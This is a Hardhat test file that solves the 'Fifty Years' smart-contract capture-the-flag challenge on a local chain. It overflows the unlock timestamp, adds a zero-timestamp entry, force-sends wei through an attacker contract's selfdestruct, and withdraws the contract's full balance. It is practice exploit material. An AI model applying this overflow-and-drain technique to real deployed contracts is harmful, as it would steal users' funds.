import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider, constants } = ethers;

describe('FiftyYearsChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;

  before(async () => {
    [owner] = await ethers.getSigners();

    const TargetFactory = await ethers.getContractFactory('FiftyYearsChallenge');
    target = await TargetFactory.deploy(owner.address, {
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const AttackerFactory = await ethers.getContractFactory('FiftyYearsChallengeAttacker');
    const attacker = await AttackerFactory.deploy();
    await attacker.deployed();

    const newContributionUnlockTimestamp = constants.MaxUint256.sub(60 * 60 * 24 - 1);

    let tx;
    tx = await target.upsert(1, newContributionUnlockTimestamp.toString(), {
      value: '1',
    });
    await tx.wait();

    tx = await target.upsert(2, 0, {
      value: '2',
    });
    await tx.wait();

    /*
      the diference is because the array length autoincrements before the item is pushed
    */
    console.log('sending the difference');
    tx = await attacker.seppuku(target.address, {
      value: 2,
    });

    console.log('withdrawing');
    tx = await target.withdraw(2);
    await tx.wait();

    console.log('target balance', utils.formatEther(await provider.getBalance(target.address)));
  });

  after(async () => {
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
